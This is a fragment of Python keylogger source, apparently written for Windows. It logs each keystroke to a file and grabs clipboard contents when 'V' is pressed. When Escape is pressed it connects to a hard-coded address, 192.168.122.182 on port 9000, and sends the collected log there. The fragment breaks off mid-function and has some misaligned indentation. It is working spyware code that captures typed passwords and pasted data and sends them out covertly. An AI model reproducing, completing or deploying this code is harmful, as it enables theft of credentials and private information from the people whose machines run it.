def KeyStroke(event):
    global keylogpath 
    global running 
    
    if event.Ascii==27 and event.Key=='Escape': #27 is the ascii of the escape key.
        file = open(keylogpath, "r+")           #Opens log file in read/write mode.
        dataLog = file.read()                   #Reads data from log file.
        file.close()                            #Closes log file.
  
        #Connect to the socket server and send keylogs
        try:    
           s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
           s.connect(("192.168.122.182", 9000))  #IP and port of the server
           s.sendall(dataLog )                    #Sends data from log file to the server
           running = False                        #Stops keylogger thread after sending logs.
   
       except Exception as e:
               print (e) 
      
    if running == True:          #Keeps logging if not sent yet.
        try:
            file = open(keylogpath, "a")  #Opens log file in append mode to write logs continuously.  
           
            if event.Ascii >32 and event.Ascii <127:    #Ascii value of 32 is a space character and 127 is the delete key. 
                file.write(chr(event.Ascii))           #Converts ascii to characters.  
            else:   
               if event.Key == "V":    #Checks if the key pressed is 'V'.  
                   clipboard = ctypes.windll.user32.GetClipboardData(1) #Asks for clipboard data which is usually what gets pasted. 
